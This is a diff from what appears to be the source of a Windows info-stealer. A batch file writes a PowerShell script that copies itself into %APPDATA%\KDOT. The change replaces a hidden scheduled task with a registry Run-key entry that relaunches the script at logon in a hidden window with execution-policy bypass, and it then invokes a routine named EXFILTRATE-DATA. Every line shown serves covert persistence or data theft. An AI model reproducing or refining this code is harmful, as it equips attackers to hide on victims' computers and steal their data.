@@ -178,14 +178,10 @@ echo New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" >> powershell123.ps1
 echo $origin = $PSCommandPath >> powershell123.ps1
 echo Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
 echo } >> powershell123.ps1
-echo $test = Get-ScheduledTask ^| Select-Object -ExpandProperty TaskName >> powershell123.ps1
-echo if ($test -contains "KDOT") { >> powershell123.ps1
-echo Write-Host "KDOT already exists" >> powershell123.ps1
-echo } else { >> powershell123.ps1
-echo $schedule = New-ScheduledTaskTrigger -AtStartup >> powershell123.ps1
-echo $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
-echo Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Limited -Force >> powershell123.ps1
-echo } >> powershell123.ps1
+echo $scriptPath = "$env:APPDATA\KDOT\KDOT.ps1" >> powershell123.ps1
+echo $command = "powershell.exe -NonInteractive -NoProfile -Nologo -ExecutionPolicy Bypass -WindowStyle hidden -File `"$scriptPath`"" >> powershell123.ps1
+echo $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" >> powershell123.ps1
+echo New-ItemProperty -Path $regPath -Name "KDOT" -Value $command -PropertyType String -Force ^| Out-Null >> powershell123.ps1
 echo EXFILTRATE-DATA >> powershell123.ps1
 echo } >> powershell123.ps1
 echo function diskdata { >> powershell123.ps1
